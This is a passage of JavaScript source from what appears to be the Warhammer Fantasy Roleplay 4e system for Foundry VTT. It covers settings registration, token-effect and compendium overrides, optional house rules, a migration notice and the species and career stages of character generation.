      name: "SETTINGS.MooCatastrophicMiscasts",
      hint: "SETTINGS.MooCatastrophicMiscastsHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

      
    game.settings.register("wfrp4e", "partialChannelling", {
      name: "SETTINGS.PartialChannelling",
      hint: "SETTINGS.PartialChannellingHint",
      scope: "world",
      homebrew: true,
      config: false,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "channellingIngredients", {
      name: "SETTINGS.ChannellingIngredients",
      hint: "SETTINGS.ChannellingIngredientsHint",
      scope: "world",
      homebrew: true,
      config: false,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooCriticalChannelling", {
      name: "SETTINGS.MooCriticalChannelling",
      hint: "SETTINGS.MooCriticalChannellingHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooCastAfterChannelling", {
      name: "SETTINGS.MooCastAfterChannelling",
      hint: "SETTINGS.MooCastAfterChannellingHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooPenetrating", {
      name: "SETTINGS.MooPenetrating",
      hint: "SETTINGS.MooPenetratingHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooQualities", {
      name: "SETTINGS.MooQualities",
      hint: "SETTINGS.MooQualitiesHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooShieldAP", {
      name: "SETTINGS.MooShieldAP",
      hint: "SETTINGS.MooShieldAPHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooCriticalMitigation", {
      name: "SETTINGS.MooCriticalMitigation",
      hint: "SETTINGS.MooCriticalMitigationHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });


    game.settings.register("wfrp4e", "mooRangeBands", {
      name: "SETTINGS.MooRangeBands",
      hint: "SETTINGS.MooRangeBandsHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "mooSizeDamage", {
      name: "SETTINGS.MooSizeDamage",
      hint: "SETTINGS.MooSizeDamageHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });

    
    game.settings.register("wfrp4e", "mooHomebrewItemChanges", {
      name: "SETTINGS.MooHomebrewItems",
      hint: "SETTINGS.MooHomebrewItemHint",
      scope: "world",
      config: false,
      homebrew: true,
      default: false,
      type: Boolean
    });
    
    // Register Unofficial Grimoire
    game.settings.register("wfrp4e", "unofficialgrimoire", {
      name: "SETTINGS.UnofficialGrimoire",
      hint: "SETTINGS.UnofficialGrimoireHint",
      scope: "world",
      homebrew: true,
      config: false,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "useWoMOvercast", {
      name: "SETTINGS.useWoMOvercast",
      hint: "SETTINGS.useWoMOvercastHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "useWoMChannelling", {
      name: "SETTINGS.useWoMChannelling",
      hint: "SETTINGS.useWoMChannellingHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "useWoMInfluences", {
      name: "SETTINGS.useWoMInfluences",
      hint: "SETTINGS.useWoMInfluencesHint",
      scope: "world",
      config: true,
      default: false,
      type: Boolean
    });

    game.settings.register("wfrp4e", "grudges", {
      name: "Grudges",
      scope: "world",
      config: false,
      default: [],
      type: Array
    });

    game.settings.register("wfrp4e", "tableSettings", {
      name: "SETTINGS.TableSettings",
      hint: "SETTINGS.TableSettings",
      scope: "world",
      config: false,
      default: {
        species : "FM6ASUoNX21MHuWa",
        minormis : "iPVwX0ul6lHVbKSX",
        majormis : "we8Vo5GC3ZsDI7aA",
        mutatephys : "YQ5XdjikeSiwo8fn",
        mutatemental : "5HKnpyOk4XDPdZ7V",
        oops : "MWkeER1iuwAJASNo",
        wrath : "CcKYnmbQyRzGkrFy",
        doom : "led1vSPKcqMpS6jp",
        critarm : "JYX8E8WgNb2em8g3",
        critleg : "j2joGAVBNJgS1G1g",
        crithead : "7KReueNRjaI6dVLk",
        critbody : "CUIX4e2hiHdSoJ64",
      },
      type: Object
    });

    CONFIG.ChatMessage.documentClass.prototype.getTest = function () {
      if (foundry.utils.hasProperty(this, "flags.testData"))
        return game.wfrp4e.rolls.TestWFRP.recreate(this.flags.testData)   
    };
    CONFIG.ChatMessage.documentClass.prototype.getOppose = function () {
      if (foundry.utils.hasProperty(this, "flags.wfrp4e.opposeData"))
        return new OpposedWFRP(getProperty(this, "flags.wfrp4e.opposeData"))
    };

    CONFIG.ChatMessage.documentClass.prototype.getOpposedTest = function () {
      if (foundry.utils.hasProperty(this, "flags.wfrp4e.opposeTestData"))
        return OpposedTest.recreate(getProperty(this, "flags.wfrp4e.opposeTestData"))
    };

    CONFIG.MeasuredTemplate.documentClass.prototype.areaEffect = async function () {
      if (this.getFlag("wfrp4e", "effectUuid"))
      {
        let effect = await fromUuid(this.getFlag("wfrp4e", "effectUuid"));
        if (effect && effect.applicationData.type != "aura")
        {
          effect.updateSource({"flags.wfrp4e.fromMessage" : this.getFlag("wfrp4e", "messageId")});
          effect.updateSource({"flags.wfrp4e.fromArea" : this.uuid});
          return effect;
        }
      }
    };

    // Pre-load templates
    loadTemplates([
      "systems/wfrp4e/templates/actors/character/character-main.hbs",
      "systems/wfrp4e/templates/actors/actor-combat.hbs",
      "systems/wfrp4e/templates/actors/actor-effects.hbs",
      "systems/wfrp4e/templates/actors/actor-biography.hbs",
      "systems/wfrp4e/templates/actors/actor-inventory.hbs",
      "systems/wfrp4e/templates/actors/actor-skills.hbs",
      "systems/wfrp4e/templates/actors/actor-magic.hbs",
      "systems/wfrp4e/templates/actors/actor-religion.hbs",
      "systems/wfrp4e/templates/actors/actor-talents.hbs",
      "systems/wfrp4e/templates/actors/actor-notes.hbs",
      "systems/wfrp4e/templates/actors/npc/npc-careers.hbs",
      "systems/wfrp4e/templates/actors/creature/creature-main.hbs",
      "systems/wfrp4e/templates/actors/creature/creature-notes.hbs",
      "systems/wfrp4e/templates/actors/creature/creature-main.hbs",
      "systems/wfrp4e/templates/actors/vehicle/vehicle-main.hbs",
      "systems/wfrp4e/templates/actors/vehicle/vehicle-cargo.hbs",
      "systems/wfrp4e/templates/actors/vehicle/vehicle-description.hbs",
      "systems/wfrp4e/templates/actors/vehicle/vehicle-effects.hbs",
      "systems/wfrp4e/templates/partials/armour-location.hbs",
      "systems/wfrp4e/templates/partials/item-container.hbs",
      "systems/wfrp4e/templates/partials/qualities-flaws.hbs",
      "systems/wfrp4e/templates/partials/overcasts.hbs",
      "systems/wfrp4e/templates/partials/wom-overcasts.hbs",
      "systems/wfrp4e/templates/partials/manual-scripts.hbs",
      "systems/wfrp4e/templates/partials/aspect-list.hbs",
      "systems/wfrp4e/templates/chat/roll/test-card.hbs",
      "systems/wfrp4e/templates/chat/help/chat-command-display-info.hbs",
      "systems/wfrp4e/templates/items/item-header.hbs",
      "systems/wfrp4e/templates/items/item-description.hbs",
      "systems/wfrp4e/templates/items/item-effects.hbs",
    ]);

    // Load name construction from files
    NameGenWfrp._loadNames();

      CONFIG.Morrslieb = new PIXI.filters.AdjustmentFilter({ green: 0.5, red: 0.25, blue: 0.25, morrslieb: true });
      CONFIG.MorrsliebObject = {
        color: { value:"#4cb53a", apply: true },
        gamma: 1.0,
        contrast: 1.0,
        brightness: 1.0,
        saturation: 0.2
    };

    CONFIG.fontDefinitions.CaslonAntique = {editor : true, fonts : []};

    CONFIG.canvasTextStyle = new PIXI.TextStyle({
      fontFamily: "CaslonAntique",
      fontSize: 36,
      fill: "#FFFFFF",
      stroke: '#111111',
      strokeThickness: 1,
      dropShadow: true,
      dropShadowColor: "#000000",
      dropShadowBlur: 4,
      dropShadowAngle: 0,
      dropShadowDistance: 0,
      align: "center",
      wordWrap: false
    });

    // Keep a list of actors that need to prepareData after 'ready' (generally those that rely on other actor data - passengers/mounts)
    game.wfrp4e.postReadyPrepare = [];


    loadTemplates({
      aspectDetails: 'systems/wfrp4e/templates/items/partials/item-aspect-details.hbs'
    });
  });
}

function FoundryOverrides () {


  // Convert functions that move data between world and compendium to retain ID
  Actors.prototype.fromCompendium = keepID(Actors.prototype.fromCompendium);
  Items.prototype.fromCompendium = keepID(Items.prototype.fromCompendium);
  Journal.prototype.fromCompendium = keepID(Journal.prototype.fromCompendium);
  Scenes.prototype.fromCompendium = keepID(Scenes.prototype.fromCompendium);
  RollTables.prototype.fromCompendium = keepID(RollTables.prototype.fromCompendium);

  Actor.implementation.prototype.toCompendium = keepID(Actor.implementation.prototype.toCompendium);
  Item.implementation.prototype.toCompendium = keepID(Item.implementation.prototype.toCompendium);
  JournalEntry.implementation.prototype.toCompendium = keepID(JournalEntry.implementation.prototype.toCompendium);
  Scene.implementation.prototype.toCompendium = keepID(Scene.implementation.prototype.toCompendium);
  RollTable.implementation.prototype.toCompendium = keepID(RollTable.implementation.prototype.toCompendium);



  function keepID(orig)
  {
    return function(...args)
    {
      try {
        args[1].keepId = true;
      }
      catch(e)
      {
        console.error("Error setting keepId: " + e);
      }
      return orig.bind(this)(...args);
    }
  }

  // Modify the initiative formula depending on whether the actor has ranks in the Combat Reflexes talent
  Combatant.prototype._getInitiativeFormula = function () {
    const actor = this.actor;
    let initiativeFormula = CONFIG.Combat.initiative.formula || game.system.initiative;

    if (!actor) return initiativeFormula;



    let args = { initiative: initiativeFormula };
    actor.runScripts("getInitiativeFormula", args);

    return args.initiative;
  };

    /**
   * Draw the active effects and overlay effect icons which are present upon the Token
   */
     Token.prototype.drawEffects = async function() 
     {
         const wasVisible = this.effects.visible;
         this.effects.visible = false;
         this.effects.removeChildren().forEach(c => c.destroy());
         this.effects.bg = this.effects.addChild(new PIXI.Graphics());
         this.effects.bg.visible = false;
         this.effects.overlay = null;
     
         // Categorize new effects
         const tokenEffects = this.document.effects;
         const actorEffects = this.actor?.temporaryEffects || [];
         let overlay = {
           src: this.document.overlayEffect,
           tint: null
         };
     
         // Draw status effects
         if ( tokenEffects.length || actorEffects.length ) {
           const promises = [];
     
           // Draw actor effects first
           for ( let f of actorEffects ) {
             if ( !f.icon ) continue;
             const tint = Color.from(f.tint ?? null);
             if ( f.getFlag("core", "overlay") ) {
               if ( overlay ) promises.push(this._drawEffect(overlay.src, overlay.tint));
               overlay = {src: f.icon, tint};
               continue;
             }
             promises.push(this._drawEffect(f.icon, tint,  foundry.utils.getProperty(f, "flags.wfrp4e.value")));
           }
     
           // Next draw token effects
           for ( let f of tokenEffects ) promises.push(this._drawEffect(f, null));
           await Promise.all(promises);
         }
     
         // Draw overlay effect
         this.effects.overlay = await this._drawOverlay(overlay.src, overlay.tint);
         this.effects.bg.visible = true;
         this.effects.visible = wasVisible;
         this._refreshEffects();
       };
    
    /* -------------------------------------------- */

    /**
     * Draw a status effect icon
     * @param {string} src
     * @param {number|null} tint
     * @returns {Promise<PIXI.Sprite|undefined>}
     * @protected
     */
    Token.prototype._drawEffect = async function(src, tint, value) {
      if ( !src ) return;
      let tex = await loadTexture(src, {fallback: "icons/svg/hazard.svg"});
      let icon = new PIXI.Sprite(tex);
      if ( tint ) icon.tint = tint;

      // Add WFRPE Counter
      if(value)
      {
        let text = new PreciseText(value, game.wfrp4e.config.effectTextStyle);
        text.x = icon.x + icon.width * 0.1;
        text.y = icon.y + icon.height * 0.05;
        text.scale.x = 20;
        text.scale.y = 20;
        icon.addChild(text);
      }
      
      return this.effects.addChild(icon);
    };


//   /**
// * Handle toggling a token status effect icon
// * @private
// */
  TokenHUD.prototype._onToggleEffect = function (event, { overlay = false } = {}) {
    event.preventDefault();
    event.stopPropagation();
    let img = event.currentTarget;
    const effect = (img.dataset.statusId && this.object.actor) ?
      CONFIG.statusEffects.find(e => e.id === img.dataset.statusId) :
      img.getAttribute("src");

    if (event.button == 0)
      return this.object.incrementCondition(effect)
    if (event.button == 2)
      return this.object.decrementCondition(effect)
    //return this.object.toggleEffect(effect, {overlay});
  };


  Token.prototype.incrementCondition = async function (effect, { active, overlay = false } = {}) {
    const existing = this.actor.hasCondition(effect.id);
    if (!existing || Number.isNumeric(getProperty(existing, "flags.wfrp4e.value")))
      await this.actor.addCondition(effect.id);
    else if (existing) // Not numeric, toggle if existing
      await this.actor.removeCondition(effect.id);

    // Update the Token HUD
    if (this.hasActiveHUD) canvas.tokens.hud.refreshStatusIcons();
    return active;
  };

  Token.prototype.decrementCondition = async function (effect, { active, overlay = false } = {}) {
    await this.actor.removeCondition(effect.id);

    // Update the Token HUD
    if (this.hasActiveHUD) canvas.tokens.hud.refreshStatusIcons();
    return active;
  };


  Token.prototype.renderAuras = function()
  {
    let actor = this.actor;
    this.auras = this.auras || [];

    for(let aura of this.auras)
    {
      aura.destroy();
    }

    if (this.isVisible)
    {
      this.auras = actor.auras.filter(auraEffect => auraEffect.applicationData.renderAura).map(aura => {
        let template = AreaHelpers.effectToTemplate(aura);
        let child = this.addChild(template);
        child.draw().then(t => {
          // Return the template to the center of the token, its PIXI parent
          // must use this.document as on initial world load this.x/y is 0
          t.template.x -= this.document.x;
          t.template.y -= this.document.y;
        });
        return child;
      });
    }
  };
  
  /**
   * Handle JournalEntry document drop data
   * @param {DragEvent} event   The drag drop event
   * @param {object} data       The dropped data transfer data
   * @protected
   */
  NotesLayer.prototype._onDropData = async function(event, data) {
    let entry;
    const coords = this._canvasCoordinatesFromDrop(event);
    if ( !coords ) return false;
    const noteData = {x: coords[0], y: coords[1]};
    if ( data.type === "JournalEntry" ) entry = await JournalEntry.implementation.fromDropData(data);
    if ( data.type === "JournalEntryPage" ) {
      const page = await JournalEntryPage.implementation.fromDropData(data);
      entry = page.parent;
      noteData.pageId = page.id;
      noteData.flags = {anchor : data.anchor };
    }
    if ( entry?.compendium ) {
      const journalData = game.journal.fromCompendium(entry);
      entry = await JournalEntry.implementation.create(journalData);
    }
    noteData.entryId = entry?.id;
    return this._createPreview(noteData, {top: event.clientY - 20, left: event.clientX + 40});
  };

 let _NoteConfigSubmitData = NoteConfig.prototype._getSubmitData;
  
  NoteConfig.prototype._getSubmitData = function(updateData={})
  {
    let data = _NoteConfigSubmitData.bind(this)(updateData);

    data["flags.anchor"] = this.object.flags.anchor;
    return data
  }; 
}

function MooHouseRules () {

  let config = game.wfrp4e.config;


  if (game.settings.get("wfrp4e", "mooDifficulty")) {

    config.difficultyModifiers["veasy"] = 40;
    config.difficultyModifiers["easy"] = 30;
    config.difficultyModifiers["average"] = 20;
    config.difficultyModifiers["challenging"] = 0;
    config.difficultyModifiers["difficult"] = -20;
    config.difficultyModifiers["hard"] = -30;
    config.difficultyModifiers["vhard"] = -40;

    config.difficultyLabels["veasy"] = game.i18n.localize ("DIFFICULTY.MooVEasy");
    config.difficultyLabels["easy"] = game.i18n.localize ("DIFFICULTY.MooEasy");
    config.difficultyLabels["average"] = game.i18n.localize ("DIFFICULTY.Average");
    config.difficultyLabels["challenging"] = game.i18n.localize ("DIFFICULTY.Challenging");
    config.difficultyLabels["difficult"] = game.i18n.localize ("DIFFICULTY.MooDifficult");
    config.difficultyLabels["hard"] = game.i18n.localize ("DIFFICULTY.MooHard");
    config.difficultyLabels["vhard"] = game.i18n.localize ("DIFFICULTY.MooVHard");

    if (config.difficultyModifiers["futile"]) {
      config.difficultyLabels["futile"] = game.i18n.localize ("DIFFICULTY.MooFutile");
      config.difficultyModifiers["futile"] = -50;

      config.difficultyLabels["impossible"] = game.i18n.localize ("DIFFICULTY.MooImpossible");
      config.difficultyModifiers["impossible"] = -60;
    }
  }

  if (game.settings.get("wfrp4e", "mooConditions"))
  {
    config.conditionDescriptions["prone"] += game.i18n.localize ("MOO.Prone");
    config.conditionDescriptions["broken"] = game.i18n.localize ("MOO.Broken");
    config.conditionDescriptions["bleeding"] = game.i18n.localize ("MOO.Bleeding");
  }

  if (game.settings.get("wfrp4e", "mooConditionTriggers"))
  {
    config.statusEffects.forEach(e => {
      if (e.applicationData?.conditionTrigger == "endRound")
        e.applicationData.conditionTrigger = "endTurn";
    });

    config.conditionDescriptions.bleeding = config.conditionDescriptions.bleeding.replace("Round", "Turn");
    config.conditionDescriptions.bleeding = config.conditionDescriptions.bleeding.replace("Round", "Turn");
    config.conditionDescriptions.poisoned = config.conditionDescriptions.poisoned.replace("Round", "Turn");
    config.conditionDescriptions.ablaze = config.conditionDescriptions.ablaze.replace("Round", "Turn");

  }

  if (game.settings.get("wfrp4e", "mooPenetrating"))
  {
    config.propertyHasValue.penetrating = true;
    config.qualityDescriptions.penetrating = game.i18n.localize ("MOO.Penetrating");
  }

  if (game.settings.get("wfrp4e", "mooQualities"))
  {
    config.weaponQualities.simple = game.i18n.localize ("Simple");
    config.qualityDescriptions.simple = game.i18n.localize ("MOO.Simple");
    config.propertyHasValue.simple = false;

    config.weaponQualities.momentum = game.i18n.localize ("Momentum");
    config.qualityDescriptions.momentum = game.i18n.localize ("MOO.Momentum");
    config.propertyHasValue.momentum = true;
  }

  if (game.settings.get("wfrp4e", "mooHomebrewItemChanges"))
  {
    fetch("systems/wfrp4e/moo/items.json").then(r => r.json()).then(async records => {
      for (let id in records)
      {
        let data = records[id];
        try {
          let item = await fromUuid(id);
          if (item)
          {
            item.updateSource(data);
            game.wfrp4e.utility.logHomebrew("mooHomebrewItemChanges: " + id + ` (${item.name})`);
          }
        }
        catch {
          game.wfrp4e.utility.log("Could not find item " + id);
        }
      }
      game.wfrp4e.utility.log("Compendium changes will revert if homebrew items is deactivated and the game is refreshed");
    });
    if (game.user.isGM)
    {
      ui.notifications.notify(game.i18n.localize ("MOO.Items"));
    }
  }

}

function ready () {
  Hooks.on("ready", async () => {


    Object.defineProperty(game.user, "isUniqueGM", {
      get: function () { return game.user.id == game.users.activeGM.id }
    });

    //***** Change cursor styles if the setting is enabled *****

    if (game.settings.get('wfrp4e', 'customCursor')) {
      WFRP_Utility.log('Using custom cursor', true);
      if (await srcExists("systems/wfrp4e/ui/cursors/pointer.png")) {
        let link = document.createElement('link');
        link.setAttribute('rel', 'stylesheet');
        link.type = 'text/css';
        link.href = 'systems/wfrp4e/css/cursor.css';

        document.head.appendChild(link);
      }
      else {
        WFRP_Utility.log('No custom cursor found', true);
      }
    }

    // Automatically disable Auto Fill Advantage if group advantage is enabled
    if (game.settings.get("wfrp4e", "useGroupAdvantage") && 
      game.user.isGM && 
      game.settings.get("wfrp4e", "autoFillAdvantage"))
    {
      ui.notifications.notify(game.i18n.localize("AutoFillAdvantageDisabled"), {permanent : true});
      game.settings.set("wfrp4e", "autoFillAdvantage", false);
    }

    game.wfrp4e.socket.register();

    const body = $("body");
    body.on("dragstart", "a.condition-chat", WFRP_Utility._onDragConditionLink);

    // if (game.modules.get("about-time") && game.modules.get("about-time").active && game.user.isUniqueGM)
    //   game.Gametime.doEvery(GM{hours:24}, () => {
    //     game.actors.contents.filter(a => a.hasPlayerOwner).forEach(a => {
    //       a.decrementDiseases()
    //       a.decrementInjuries()
    //     })
    //   })




    const MIGRATION_VERSION = 9;
    let needMigration = foundry.utils.isNewerVersion(MIGRATION_VERSION, game.settings.get("wfrp4e", "systemMigrationVersion"));
    if (needMigration && game.user.isGM) {
      ChatMessage.create({content: `<h1>The Effect Refactor</h1>
        <p>WFRP4e Version 7.1.0 has entirely reworked how Active Effects are implemented, and all the automation you're used to has been vastly improved! However, existing Actors need to be updated manually. The automatic migration handles the basics, but won't update your Actors with the new Items.</p>
        
        <p><strong>Minimum</strong>: Make sure your preimum modules are updated! Delete module content you've imported in your world, then replace every Talent on your unique Actors, like Player Characters or other ones you've created yourself. Reimport the module content you wish to use, which should be updated with the latest Items.</p>
        
        <p>If Talents aren't replaced in this way, you may notice that the Roll Dialog won't have the selectable SL bonuses from the Talents.<p/>
        
        <p><a href="https://moo-man.github.io/WFRP4e-FoundryVTT/pages/effects/effect-refactor.html">Read more about the Effect Refactor</a></p>
        `
      }, {speaker : {alias : "ATTENTION"}}
        );
      game.wfrp4e.migration.migrateWorld();
    }
    game.settings.set("wfrp4e", "systemMigrationVersion", MIGRATION_VERSION);




    // Some entities require other entities to be loaded to prepare correctly (vehicles and mounts)
    for (let e of game.wfrp4e.postReadyPrepare)
      e.prepareData();

    CONFIG.statusEffects = game.wfrp4e.config.statusEffects;

    MooHouseRules();
    canvas.tokens.placeables.forEach(t => t.drawEffects());

    game.wfrp4e.tags.createTags();

    
    if (game.release.generation == 12)
    {
      ui.notifications.warn("Please note that the <strong>WFRP4e System</strong> has not been made fully compatible with V12 and issues may occur.");
    }


  });

  FoundryOverrides();
}

class ChargenStage extends FormApplication {
  active = false;
  html = "";
  data = {};
  context = {};
  journalId = ""

  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.id = "chargen-stage";
    options.classes = options.classes.concat("wfrp4e", "chargen");
    options.width = 1000;
    options.height = 600;
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.Title");
    options.scrollY = [".chargen-content"];
    options.cannotResubmit = false;
    return options;
  }

  
  _getHeaderButtons() {
    let buttons = super._getHeaderButtons();
      buttons.unshift(
        {
          class: "help",
          icon: "fa-solid fa-circle-question",
          onclick: async ev => this.renderJournalPage()
        });
    return buttons
  }

  async renderJournalPage()
  {
    let journalPage = await fromUuid(this.journalId);

    if (journalPage)
    {
      await journalPage.parent.sheet._render(true);
      journalPage.parent.sheet.goToPage(journalPage.id);
    }
  }

  constructor(object, options) {
    super(object, options);
    this.data = object;
  }

  async getData() {
    return { data: this.data, context: this.context };
  }

  async validate() {

    let valid = !this.options.cannotResubmit || !this.options.isCompleted; 
    if (!valid)
    {
      this.showError("StageAlreadySubmitted");
    }
    return valid
  }

  showError(key, args)
  {
    ui.notifications.error(game.i18n.format("CHARGEN.ERROR." + key, args));
  }


  updateMessage(key, args={}, string = null)
  {
    args.user = game.user.name;
    if (this.options.message)
    {
      let content = this.options.message.content;

      if (string)
        content += string;
      else
        content += game.i18n.format("CHARGEN.Message." + key, args);

     return this.options.message.update({content})
    }

  }



  // HTML to add to the char gen application
  async addToDisplay() {
    return null
  }

  static stageData() 
  {
    return {
      class: this,
      key: "stage",
      title: null,
      dependantOn: [],
      app: null,
      complete: false
    }
  }

  _updateObject(event, formData) {
    this.options.complete(this.options.index);
  }

   async _onSubmit(...args) {
    args[0].preventDefault();
    if (await this.validate())
    {
      this.options.isCompleted = true;
      super._onSubmit(...args);
    }
  }

  activateListeners(html) {
    super.activateListeners(html);
    html.on("click", '.chargen-button, .chargen-button-nostyle', this.onButtonClick.bind(this));
    html.on("click", '.item-lookup', this._onItemLookupClicked.bind(this));

    // Autoselect entire text 
    html.find("input").on("focusin", ev => {
      ev.target.select();
    });
  }


  onButtonClick(ev) {
    let type = ev.currentTarget.dataset.button;
    if (typeof this[type] == "function") {
      this[type](ev);
    }
  }

  async _onItemLookupClicked(ev) {
    let itemType = $(ev.currentTarget).attr("data-type");
    let openMethod = $(ev.currentTarget).attr("data-open") || "sheet"; // post or sheet
    let name = $(ev.currentTarget).attr("data-name") || ev.currentTarget.text; // Use name attribute if available, otherwis, use text clicked.
    let item;
    if (name)
      item = await WFRP_Utility.find(name, itemType);

    if (item) {
      if (openMethod == "sheet")
        item.sheet.render(true);

      else
        item.postItem();
    }
  }



}

class SpeciesStage extends ChargenStage {

  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.l0f11ypRjH9sR48Q"

  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.width = 450;
    options.height = 550;
    options.classes.push("species");
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.StageSpecies");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageSpecies"); }


  get template() {
    return "systems/wfrp4e/templates/apps/chargen/species.hbs";
  }


  context = {
    species: "",
    subspecies: "",
    exp: 0
  };


  async getData() {
    let data = await super.getData();

    data.context = this.context;

    let speciesTable = game.wfrp4e.tables.findTable("species");

    if (!speciesTable)
    {
      ui.notifications.error(game.i18n.localize("CHARGEN.ERROR.SpeciesTable"));
      throw new Error (game.i18n.localize("CHARGEN.ERROR.SpeciesTable"))
    }

    data.species = {};

    for (let result of speciesTable.results)
    {
      let speciesKey = game.wfrp4e.utility.findKey(result.text, game.wfrp4e.config.species);
      if (speciesKey)
      {
        data.species[speciesKey] = result.text;
      }
    }

    data.speciesDisplay = game.wfrp4e.config.species[this.context.species];

    if (this.context.species && game.wfrp4e.config.subspecies[this.context.species]) {
      data.subspeciesChoices = game.wfrp4e.config.subspecies[this.context.species];
    }

    if (this.context.subspecies) {
      data.speciesDisplay += ` (${game.wfrp4e.config.subspecies[this.context.species][this.context.subspecies]?.name})`;
    }

    return data;
  }


  async validate() {
    let valid = super.validate();
    if (!this.context.species)
    {
      this.showError("SpeciesSubmit");
      valid = false;
    }
    return valid
  }


  /**
   * The user is allowed to freely click and choose species, but can only roll for it one time.
   * After species is rolled, user can click and choose a different species, but cannot go back and roll again
   */
  activateListeners(html) {
    super.activateListeners(html);
    html.on("click", '.species-select', this.onSelectSpecies.bind(this));
    html.on("click", '.subspecies-select', this.onSelectSubspecies.bind(this));
  }


  // Set roll, unselect whatever user has chosen
  async onRollSpecies(event) {
    event.stopPropagation();
    this.context.exp = 20;
    this.context.roll = await game.wfrp4e.tables.rollTable("species");
    this.context.choose = false;
    this.updateMessage("Rolled", {rolled : this.context.roll.result});
    this.setSpecies(this.context.roll.species);
  }

  // Set chosen species, but don't unset "roll" (prevents users from rolling again after they've rolled once)
  onSelectSpecies(event) {
    this.context.exp = 0;
    this.context.choose = event.currentTarget.dataset.species;
    this.updateMessage("Chosen", {chosen : game.wfrp4e.config.species[this.context.choose]});
    this.setSpecies(this.context.choose);
  }


  onSelectSubspecies(event) {
    this.setSpecies(this.context.species, event.currentTarget.dataset.subspecies);
  }


  _updateObject(event, formData) {
    this.data.species = this.context.species;
    this.data.subspecies = this.context.subspecies;
    this.data.exp.species = this.context.exp;
    super._updateObject(event, formData);

  }


  setSpecies(species, subspecies) {
    this.context.species = species;
    if (subspecies) {
      this.context.subspecies = subspecies;
    }
    else if (Object.keys(game.wfrp4e.config.subspecies[species] || {})?.length == 1) {
      this.context.subspecies = Object.keys(game.wfrp4e.config.subspecies[species])[0];
    }
    else {
      this.context.subspecies = "";
    }
    this.render(true);
  }
}

class CareerStage extends ChargenStage {
  journalId = "Compendium.wfrp4e-core.journals.JournalEntry.IQ0PgoJihQltCBUU.JournalEntryPage.bS2sxusEp1FEqmRk"
  static get defaultOptions() {
    const options = super.defaultOptions;
    options.resizable = true;
    options.width = 400;
    options.height = 670;
    options.classes.push("career");
    options.minimizable = true;
    options.title = game.i18n.localize("CHARGEN.StageCareer");
    return options;
  }

  static get title() { return game.i18n.localize("CHARGEN.StageCareer"); }

  constructor(...args) {
    super(...args);
    this.careers = this.loadCareers();
    this.context.step = 0;
    this.context.careers = [];
    this.context.replacements = [];
    this.context.career = null;
    this.context.exp = 0;
  }


  get template() {
    return "systems/wfrp4e/templates/apps/chargen/career.hbs";
  }


  async onRollCareer(event) {
    this.context.step++;

    // First step, roll 1 career
    if (this.context.step == 1) {
      this.context.exp = 50;
      await this.addCareerChoice();
      // QoL: Upon the first career roll, automatically set the selected career to it
      this.context.career = this.context.careers[0];
    }
    // Second step, Roll 2 more careers
    if (this.context.step == 2) {
      this.context.exp = 25;
      await this.addCareerChoice(2);
    }
    // Third step, keep rolling careers
    if (this.context.step >= 3) {
      this.context.exp = 0;
      await this.addCareerChoice();
    }
  }

  // Career selected, move on to the next step
  async onSelectCareer(ev) {
    let careerItem = await this.findT1Careers(ev.currentTarget.dataset.career);
    if (careerItem) {
      this.context.career = careerItem[0];
      this.updateMessage("Chosen", {chosen : this.context.career.name});

    }
    else {
      throw new Error(gam.i18n.format("CHARGEN.ERROR.CareerItem", {career : ev.currentTarget.dataset.career}));
    }
    this.render(true);
  }

  _updateObject(event, formData) {
    this.data.items.career = this.context.career.toObject();
    this.data.exp.career = this.context.exp;

    this.data.items.career.system.current.value = true;
    super._updateObject(event, formData);

  }

  async getData() {
    let data = await super.getData();
    for (let c of this.context.careers.concat(this.context.replacements)) {
      c.enriched = await TextEditor.enrichHTML(c.system.description.value, { async: true });
    }
    data.showChooseButton = this.context.replacements.length + this.context.careers.length > 1;
    return data
  }


  async _onDrop(ev) {
    let dragData = JSON.parse(ev.dataTransfer.getData("text/plain"));

    if (dragData.type == "Item") {
      let career = await Item.implementation.fromDropData(dragData);

      if (career.type != "career")
        return

      // If career level is not T1, find the T1 career and use that instead
      else if (career.system.level.value > 1)
      {
        let careerT1 = await this.findT1Careers(career.system.careergroup.value);
        if (careerT1[0])
          career = careerT1[0];
      }

      this.context.step = 4;
      this.context.exp = 0;
      this.context.careers.push(career);
      this.context.career = career;
      this.updateMessage("Chosen", {chosen : career.name});
    }
    this.render(true);
  }

  async validate() {
    let valid = super.validate();
    if (!this.context.career)
    {
      this.showError("CareerSubmit");
      valid = false;
    }
    return valid
  }

  async addCareerChoice(number = 1) {
    let rollSpecies = this.data.species;

    // If subspecies has defined specific table, and it's found, use that
    let subspeciesCareerTable = this.data.subspecies && game.wfrp4e.config.subspecies[this.data.species][this.data.subspecies]?.careerTable || null;
    if (subspeciesCareerTable && game.wfrp4e.tables.findTable("career", subspeciesCareerTable))
      rollSpecies = game.wfrp4e.config.subspecies[this.data.species][this.data.subspecies]?.careerTable;
    // If subspecies table is found, use that
